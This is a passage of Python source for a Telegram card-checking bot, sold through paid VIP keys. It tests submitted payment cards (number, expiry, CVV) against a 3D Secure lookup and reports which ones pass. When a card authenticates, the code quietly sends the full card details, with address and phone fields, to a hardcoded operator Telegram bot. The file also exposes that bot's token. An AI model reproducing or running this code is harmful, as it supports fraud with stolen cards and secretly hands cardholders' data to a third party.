			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 » {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 » {ig}
𝗞𝗘𝗬 » <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3D Lookup'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>Uh oh! Seems like your subscription is expired, please contact admin to renew it</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		last= str(vbv(cc))
		if 'result not found' in last:
			last='Authenticate Frictionless Failed'
	except Exception as e:
		last='Error'
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'unknown'
	try:
		brand = data['brand']
	except:
		brand = 'unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'unknown'
		country_flag = 'unknown'
	try:
		bank = data['bank']
	except:
		bank = 'unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗣𝗮𝘀𝘀𝗲𝗱 ✅
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
	msgd=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acc =  '-4248306465'
		mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acb =  '-4248306465'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'

	
print("\033[92mThe bot is now up and running!\033[0m")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"an error occurred: {e}")
		print(f'ok')
	time.sleep(0)

if sys.version_info[0] < 3: 
    reload(sys) 
sys.setdefaultencoding('utf-8')
